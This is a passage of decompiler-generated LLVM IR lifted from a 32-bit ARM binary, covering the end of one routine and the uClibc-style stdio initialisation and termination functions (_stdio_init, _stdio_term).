dec_label_pc_15e10:                               ; preds = %dec_label_pc_15e40.dec_label_pc_15e10_crit_edge, %dec_label_pc_15e08
  %v0_15e10 = phi i32 [ %v0_15e10.pre, %dec_label_pc_15e40.dec_label_pc_15e10_crit_edge ], [ %v0_15e0c, %dec_label_pc_15e08 ]
  %v1_15e10 = inttoptr i32 %v0_15e10 to i32*
  %v2_15e10 = load i32, i32* %v1_15e10, align 4
  store i32 %v2_15e10, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15e10, i32* %r2.global-to-local, align 4
  %v2_15e1c71 = load i32, i32* %v1_15e10, align 4
  store i32 %v2_15e1c71, i32* %r3.global-to-local, align 4
  %v3_15e2073 = icmp uge i32 %v2_15e1c71, %v2_15e10
  store i1 %v3_15e2073, i1* %cpsr_c.global-to-local, align 1
  %v9_15e2079 = icmp eq i32 %v2_15e1c71, %v2_15e10
  br i1 %v9_15e2079, label %dec_label_pc_15e28, label %dec_label_pc_15e40

dec_label_pc_15e28:                               ; preds = %dec_label_pc_15e10, %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge
  %v0_15e2880 = phi i32 [ %v1_15e20.pre, %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge ], [ %v2_15e10, %dec_label_pc_15e10 ]
  store i32 %v0_15e2880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15e38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15e38, label %dec_label_pc_15e3c, label %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge

dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge:  ; preds = %dec_label_pc_15e28
  %v0_15e1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15e20.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15e1c = inttoptr i32 %v0_15e1c.pre to i32*
  %v2_15e1c = load i32, i32* %v1_15e1c, align 4
  store i32 %v2_15e1c, i32* %r3.global-to-local, align 4
  %v3_15e20 = icmp uge i32 %v2_15e1c, %v1_15e20.pre
  store i1 %v3_15e20, i1* %cpsr_c.global-to-local, align 1
  %v9_15e20 = icmp eq i32 %v2_15e1c, %v1_15e20.pre
  br i1 %v9_15e20, label %dec_label_pc_15e28, label %dec_label_pc_15e40

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15e28
  %v0_15e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e10, %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge, %dec_label_pc_15e3c
  %v0_15e48 = phi i32 [ %v0_15e3c, %dec_label_pc_15e3c ], [ %v2_15e1c71, %dec_label_pc_15e10 ], [ %v2_15e1c, %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge ]
  %v1_15e40 = phi i32 [ %v0_15e3c, %dec_label_pc_15e3c ], [ %v2_15e10, %dec_label_pc_15e10 ], [ %v1_15e20.pre, %dec_label_pc_15e28.dec_label_pc_15e1c_crit_edge ]
  %v3_15e40 = icmp uge i32 %v0_15e48, %v1_15e40
  store i1 %v3_15e40, i1* %cpsr_c.global-to-local, align 1
  %v9_15e40 = icmp eq i32 %v0_15e48, %v1_15e40
  br i1 %v9_15e40, label %dec_label_pc_15e48, label %dec_label_pc_15e40.dec_label_pc_15e10_crit_edge

dec_label_pc_15e40.dec_label_pc_15e10_crit_edge:  ; preds = %dec_label_pc_15e40
  %v0_15e10.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e40
  %v2_15e48 = icmp ne i32 %v1_15e40, 0
  store i1 %v2_15e48, i1* %cpsr_c.global-to-local, align 1
  %v7_15e4c = icmp slt i32 %v1_15e40, 2
  br i1 %v7_15e4c, label %dec_label_pc_15e70, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e48
  %v0_15e50 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15e50, i32* %r0.global-to-local, align 4
  %v0_15e54 = load i32, i32* @r1, align 4
  %v1_15e54 = add i32 %v0_15e54, 129
  store i32 %v1_15e54, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15ab0, %dec_label_pc_15a94, %dec_label_pc_15abc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15dec, %dec_label_pc_15e48, %bb57, %dec_label_pc_15af4, %dec_label_pc_15e50, %dec_label_pc_15e6c
  %v0_15e70 = load i32, i32* @r5, align 4
  store i32 %v0_15e70, i32* %r0.global-to-local, align 4
  %v2_15e78 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15e78, i32* %r4.global-to-local, align 4
  store i32 %v6_15a54, i32* @r5, align 4
  store i32 %v9_15a54, i32* @r6, align 4
  store i32 %v12_15a54, i32* @r7, align 4
  store i32 %v15_15a54, i32* @r8, align 4
  ret i32 %v0_15e70

; uselistorder directives
  uselistorder i32 %v0_15e3c, { 1, 0, 2 }
  uselistorder i32 %v1_15e20.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15e10, { 1, 0 }
  uselistorder i32 %v0_15dc0, { 1, 0, 2 }
  uselistorder i32 %v1_15da4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15d94, { 1, 0 }
  uselistorder i32 %v0_15d3c, { 1, 0, 2 }
  uselistorder i32 %v1_15d20.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15cd4, { 1, 0, 2 }
  uselistorder i32 %v1_15cb8, { 0, 2, 1 }
  uselistorder i32 %v4_15c94, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15c44.pre, { 2, 1, 0 }
  uselistorder i32 %v0_15bc8, { 1, 2, 0 }
  uselistorder i32 %v1_15b58, { 1, 0 }
  uselistorder i32 %v0_15b58, { 1, 0 }
  uselistorder i32 %v1_15b40, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15ae4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 7, 6, 1, 8, 9, 10, 11, 12, 14, 13, 2, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 5, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 11, 10, 1, 12, 13, 15, 14, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 16384, { 66, 67, 0, 68, 37, 69, 38, 70, 39, 71, 40, 72, 41, 73, 42, 74, 18, 75, 17, 60, 3, 50, 35, 51, 4, 52, 36, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 34, 61, 11, 62, 12, 63, 13, 64, 14, 65, 43, 76, 15, 77, 16, 78, 20, 79, 45, 80, 46, 81, 47, 82, 19, 83, 44, 84, 85, 21, 86, 22, 87, 23, 88, 48, 89, 24, 1, 25, 90, 26, 91, 28, 92, 27, 93, 30, 94, 29, 95, 49, 96, 31, 2, 32, 97, 33, 98 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 12, 11, 2, 1, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 46, 45, 44, 4, 3, 2, 0, 1, 7, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_15e70, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15e6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e28, { 1, 0 }
  uselistorder label %dec_label_pc_15dec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15dc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15dac, { 1, 0 }
  uselistorder label %dec_label_pc_15d50, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_15d40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d28, { 1, 0 }
  uselistorder label %dec_label_pc_15ce8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_15cd8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c20, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_15b88._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15b30, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15acc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a94, { 1, 2, 0 }
}

define i32 @function_15e84(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15e84:
  %v0_15e84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15e84, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15e84
  %v1_15e8c = load i32, i32* @r4, align 4
  %v2_15e8c = mul i32 %v1_15e8c, 89748
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15e84, %bb
  %v3_15e8c = phi i32 [ %arg1, %dec_label_pc_15e84 ], [ %v2_15e8c, %bb ]
  ret i32 %v3_15e8c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_15ebc = call i32 @__aeabi_read_tp()
  %v3_15ec0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_15ec0 = sext i16 %v3_15ec0 to i32
  store i32 %v4_15ec0, i32* @r3, align 4
  store i32 %v0_15ebc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_15ecc = add i32 %v4_15ec0, %v0_15ebc
  %v3_15ecc = inttoptr i32 %v2_15ecc to i32*
  %v4_15ecc = load i32, i32* %v3_15ecc, align 4
  store i32 %v4_15ecc, i32* @r6, align 4
  %v1_15ed0 = call i32 @isatty(i32 0)
  %v2_15ed8 = icmp eq i32 %v1_15ed0, 0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r4, align 4
  br i1 %v2_15ed8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_15ee4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 308) to i16*), align 4
  %v7_15ee4 = zext i16 %v5_15ee4 to i32
  %v2_15ee8 = xor i32 %v7_15ee4, 256
  store i32 %v2_15ee8, i32* @r3, align 4
  %v2_15eec = trunc i32 %v2_15ee8 to i16
  store i16 %v2_15eec, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_15ef4 = call i32 @isatty(i32 1)
  %v2_15ef8 = icmp eq i32 %v1_15ef4, 0
  br i1 %v2_15ef8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_15f00 = load i32, i32* @r4, align 4
  %v2_15f04 = add i32 %v1_15f00, 376
  %v3_15f04 = inttoptr i32 %v2_15f04 to i16*
  %v4_15f04 = load i16, i16* %v3_15f04, align 2
  %v2_15f08 = xor i16 %v4_15f04, 256
  store i16 %v2_15f08, i16* %v3_15f04, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_15f14 = load i16, i16* @global_var_21a38.351, align 2
  %v4_15f14 = sext i16 %v3_15f14 to i32
  %v0_15f18 = load i32, i32* @r6, align 4
  %v1_15f18 = load i32, i32* @r5, align 4
  %v3_15f18 = add i32 %v1_15f18, %v4_15f14
  %v4_15f18 = inttoptr i32 %v3_15f18 to i32*
  store i32 %v0_15f18, i32* %v4_15f18, align 4
  ret i32 %v1_15ef4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15f34 = load i32, i32* @r4, align 4
  store i32 %v3_15f34, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_15f48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_15f48, i32* %r0.global-to-local, align 4
  %v5_15f48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_15f48, i32* %r1.global-to-local, align 4
  %v8_15f48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33092) to i32*), align 4
  %v2_15f50 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15f50, i32* %r3.global-to-local, align 4
  store i32 %v2_15f48, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_15f5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 152) to i32*), align 4
  store i32 %v2_15f48, i32* %r0.global-to-local, align 4
  store i32 %v5_15f48, i32* %r1.global-to-local, align 4
  store i32 %v8_15f48, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_15f6c = inttoptr i32 %v4_15f5c to i32*
  store i32 %v2_15f48, i32* %v1_15f6c, align 4
  %v3_15f6c = add i32 %v4_15f5c, 4
  %v4_15f6c = inttoptr i32 %v3_15f6c to i32*
  %v5_15f6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15f6c, i32* %v4_15f6c, align 4
  %v6_15f6c = add i32 %v4_15f5c, 8
  %v7_15f6c = inttoptr i32 %v6_15f6c to i32*
  %v8_15f6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15f6c, i32* %v7_15f6c, align 4
  %v0_15f70 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f70 = inttoptr i32 %v0_15f70 to i32*
  %v2_15f70 = load i32, i32* %v1_15f70, align 4
  store i32 %v2_15f70, i32* %r0.global-to-local, align 4
  %v3_15f70 = add i32 %v0_15f70, 4
  %v4_15f70 = inttoptr i32 %v3_15f70 to i32*
  %v5_15f70 = load i32, i32* %v4_15f70, align 4
  store i32 %v5_15f70, i32* %r1.global-to-local, align 4
  %v6_15f70 = add i32 %v0_15f70, 8
  %v7_15f70 = inttoptr i32 %v6_15f70 to i32*
  %v8_15f70 = load i32, i32* %v7_15f70, align 4
  %v2_15f74 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15f74, i32* %r3.global-to-local, align 4
  store i32 %v2_15f70, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_15f80 = load i32, i32* %r7.global-to-local, align 4
  %v2_15f80 = add i32 %v0_15f80, 76
  %v3_15f80 = inttoptr i32 %v2_15f80 to i32*
  %v4_15f80 = load i32, i32* %v3_15f80, align 4
  store i32 %v4_15f80, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_15f88 = inttoptr i32 %v4_15f80 to i32*
  %v2_15f88 = load i32, i32* %v1_15f88, align 4
  store i32 %v2_15f88, i32* %r5.global-to-local, align 4
  %v2_15f8c = add i32 %v0_15f80, 160
  %v3_15f8c = inttoptr i32 %v2_15f8c to i32*
  %v4_15f8c = load i32, i32* %v3_15f8c, align 4
  store i32 %v2_15f70, i32* %r0.global-to-local, align 4
  store i32 %v5_15f70, i32* %r1.global-to-local, align 4
  store i32 %v8_15f70, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_15f9c = add i32 %v0_15f80, -33124
  store i32 %v2_15f9c, i32* %sl.global-to-local, align 4
  %v1_15fa0 = inttoptr i32 %v4_15f8c to i32*
  store i32 %v2_15f70, i32* %v1_15fa0, align 4
  %v3_15fa0 = add i32 %v4_15f8c, 4
  %v4_15fa0 = inttoptr i32 %v3_15fa0 to i32*
  %v5_15fa0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15fa0, i32* %v4_15fa0, align 4
  %v6_15fa0 = add i32 %v4_15f8c, 8
  %v7_15fa0 = inttoptr i32 %v6_15fa0 to i32*
  %v8_15fa0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15fa0, i32* %v7_15fa0, align 4
  %v0_16030.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1603016 = icmp eq i32 %v0_16030.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1603818 = add i32 %v0_16030.pr, 56
  store i32 %v1_1603818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1603016, label %dec_label_pc_16044, label %dec_label_pc_15fa8

dec_label_pc_15fa8:                               ; preds = %entry, %.thread10
  %v0_15fa8 = phi i32 [ %v3_1602c, %.thread10 ], [ %v0_16030.pr, %entry ]
  %v1_15fa8 = add i32 %v0_15fa8, 64
  %v2_15fa8 = inttoptr i32 %v1_15fa8 to i32*
  %v3_15fa8 = load i32, i32* %v2_15fa8, align 4
  store i32 %v3_15fa8, i32* %r3.global-to-local, align 4
  %v0_15fac = call i32 @__aeabi_read_tp()
  store i32 %v0_15fac, i32* %r0.global-to-local, align 4
  %v1_15fb0 = add i32 %v0_15fac, -1168
  store i32 %v1_15fb0, i32* %r6.global-to-local, align 4
  %v3_15fb4 = icmp uge i32 %v3_15fa8, %v1_15fb0
  store i1 %v3_15fb4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fb4 = icmp eq i32 %v3_15fa8, %v1_15fb0
  br i1 %v9_15fb4, label %.thread1, label %dec_label_pc_15fc8

.thread1:                                         ; preds = %dec_label_pc_15fa8
  %v1_15fb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15fb8 = add i32 %v1_15fb8, 60
  %v3_15fb8 = inttoptr i32 %v2_15fb8 to i32*
  %v4_15fb8 = load i32, i32* %v3_15fb8, align 4
  %v2_15fbc = add i32 %v4_15fb8, 1
  store i32 %v2_15fbc, i32* %r3.global-to-local, align 4
  store i32 %v2_15fbc, i32* %v3_15fb8, align 4
  br label %.thread10

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15fa8, %dec_label_pc_15fd4
  %v0_15fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fc8 = inttoptr i32 %v0_15fc8 to i32*
  %v2_15fc8 = load i32, i32* %v1_15fc8, align 4
  store i32 %v2_15fc8, i32* %r3.global-to-local, align 4
  %v1_15fcc = load i32, i32* %r4.global-to-local, align 4
  %v3_15fcc = icmp uge i32 %v2_15fc8, %v1_15fcc
  store i1 %v3_15fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_15fcc = icmp eq i32 %v2_15fc8, %v1_15fcc
  br i1 %v9_15fcc, label %dec_label_pc_15fd4, label %dec_label_pc_15fec

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fc8
  store i32 %v2_15fc8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fe4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fe4, label %dec_label_pc_15fe8, label %dec_label_pc_15fc8

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fd4
  %v0_15fe8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15fe8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15fc8, %dec_label_pc_15fe8
  %v0_15fec = phi i32 [ %v0_15fe8, %dec_label_pc_15fe8 ], [ %v2_15fc8, %dec_label_pc_15fc8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fec = icmp eq i32 %v0_15fec, 0
  %v2_15ff8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15fec, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_15fec
  %v1_15ff8 = load i32, i32* %r6.global-to-local, align 4
  %v3_15ff8 = add i32 %v2_15ff8.pre, 64
  %v4_15ff8 = inttoptr i32 %v3_15ff8 to i32*
  store i32 %v1_15ff8, i32* %v4_15ff8, align 4
  %v1_15ffc = load i32, i32* %r1.global-to-local, align 4
  %v2_15ffc = load i32, i32* %r5.global-to-local, align 4
  %v3_15ffc = add i32 %v2_15ffc, 60
  %v4_15ffc = inttoptr i32 %v3_15ffc to i32*
  store i32 %v1_15ffc, i32* %v4_15ffc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_15fec
  %v2_15ff0 = add i32 %v2_15ff8.pre, 8
  %v3_15ff0 = inttoptr i32 %v2_15ff0 to i32*
  %v4_15ff0 = load i32, i32* %v3_15ff0, align 4
  store i32 %v4_15ff0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16000 = add i32 %v2_15ff8.pre, 20
  %v4_16000 = inttoptr i32 %v3_16000 to i32*
  store i32 %v4_15ff0, i32* %v4_16000, align 4
  %v1_16004 = load i32, i32* %r2.global-to-local, align 4
  %v2_16004 = trunc i32 %v1_16004 to i16
  %v3_16004 = load i32, i32* %r5.global-to-local, align 4
  %v4_16004 = inttoptr i32 %v3_16004 to i16*
  store i16 %v2_16004, i16* %v4_16004, align 2
  %v1_16008 = load i32, i32* %r3.global-to-local, align 4
  %v2_16008 = load i32, i32* %r5.global-to-local, align 4
  %v3_16008 = add i32 %v2_16008, 24
  %v4_16008 = inttoptr i32 %v3_16008 to i32*
  store i32 %v1_16008, i32* %v4_16008, align 4
  %v1_1600c = load i32, i32* %r3.global-to-local, align 4
  %v2_1600c = load i32, i32* %r5.global-to-local, align 4
  %v3_1600c = add i32 %v2_1600c, 28
  %v4_1600c = inttoptr i32 %v3_1600c to i32*
  store i32 %v1_1600c, i32* %v4_1600c, align 4
  %v1_16010 = load i32, i32* %r3.global-to-local, align 4
  %v2_16010 = load i32, i32* %r5.global-to-local, align 4
  %v3_16010 = add i32 %v2_16010, 16
  %v4_16010 = inttoptr i32 %v3_16010 to i32*
  store i32 %v1_16010, i32* %v4_16010, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16014 = load i32, i32* %sl.global-to-local, align 4
  %v1_16014 = inttoptr i32 %v0_16014 to i32*
  %v2_16014 = load i32, i32* %v1_16014, align 4
  store i32 %v2_16014, i32* %r0.global-to-local, align 4
  %v3_16014 = add i32 %v0_16014, 4
  %v4_16014 = inttoptr i32 %v3_16014 to i32*
  %v5_16014 = load i32, i32* %v4_16014, align 4
  store i32 %v5_16014, i32* %r1.global-to-local, align 4
  %v6_16014 = add i32 %v0_16014, 8
  %v7_16014 = inttoptr i32 %v6_16014 to i32*
  %v8_16014 = load i32, i32* %v7_16014, align 4
  store i32 %v8_16014, i32* %r2.global-to-local, align 4
  %v1_1601c = load i32, i32* %r5.global-to-local, align 4
  %v2_1601c = add i32 %v1_1601c, 52
  %v3_1601c = inttoptr i32 %v2_1601c to i32*
  store i32 1, i32* %v3_1601c, align 4
  %v0_16020 = load i32, i32* %r5.global-to-local, align 4
  %v1_16020 = add i32 %v0_16020, 56
  store i32 %v1_16020, i32* %r3.global-to-local, align 4
  %v2_16024 = load i32, i32* %r0.global-to-local, align 4
  %v1_16028 = inttoptr i32 %v1_16020 to i32*
  store i32 %v2_16024, i32* %v1_16028, align 4
  %v3_16028 = add i32 %v0_16020, 60
  %v4_16028 = inttoptr i32 %v3_16028 to i32*
  %v5_16028 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16028, i32* %v4_16028, align 4
  %v6_16028 = add i32 %v0_16020, 64
  %v7_16028 = inttoptr i32 %v6_16028 to i32*
  %v8_16028 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16028, i32* %v7_16028, align 4
  %v0_1602c = load i32, i32* %r5.global-to-local, align 4
  %v1_1602c = add i32 %v0_1602c, 32
  %v2_1602c = inttoptr i32 %v1_1602c to i32*
  %v3_1602c = load i32, i32* %v2_1602c, align 4
  store i32 %v3_1602c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16030 = icmp eq i32 %v3_1602c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16038 = add i32 %v3_1602c, 56
  store i32 %v1_16038, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16030, label %dec_label_pc_16044, label %dec_label_pc_15fa8

dec_label_pc_16044:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_16048 = load i32, i32* %r7.global-to-local, align 4
  %v2_16048 = add i32 %v0_16048, 76
  %v3_16048 = inttoptr i32 %v2_16048 to i32*
  %v4_16048 = load i32, i32* %v3_16048, align 4
  store i32 %v4_16048, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_16048 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1606814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1606814, label %dec_label_pc_16070, label %dec_label_pc_16054

dec_label_pc_16054:                               ; preds = %dec_label_pc_16044, %dec_label_pc_16068
  %v1_1605c = phi i32 [ %storemerge, %dec_label_pc_16068 ], [ %storemerge12, %dec_label_pc_16044 ]
  %v1_16054 = inttoptr i32 %v1_1605c to i16*
  %v2_16054 = load i16, i16* %v1_16054, align 2
  %v3_16054 = zext i16 %v2_16054 to i32
  store i32 %v3_16054, i32* %r3.global-to-local, align 4
  %v1_16058 = and i32 %v3_16054, 64
  %v2_16058 = icmp eq i32 %v1_16058, 0
  br i1 %v2_16058, label %dec_label_pc_16068, label %bb39

bb39:                                             ; preds = %dec_label_pc_16054
  store i32 %v1_1605c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %dec_label_pc_16054, %bb39
  %v1_16060 = xor i1 %v2_16058, true
  call void @__pseudo_cond_branch(i1 %v1_16060, i32 ptrtoint (i32* @global_var_16098.632 to i32))
  %v0_16064 = load i32, i32* %r4.global-to-local, align 4
  %v1_16064 = add i32 %v0_16064, 32
  %storemerge.in = inttoptr i32 %v1_16064 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16068 = icmp eq i32 %storemerge, 0
  br i1 %v2_16068, label %dec_label_pc_16070, label %dec_label_pc_16054

dec_label_pc_16070:                               ; preds = %dec_label_pc_16068, %dec_label_pc_16044
  %v2_16074 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16074, i32* %r4.global-to-local, align 4
  %v1_16078 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16078

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1602c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15fcc, { 1, 0 }
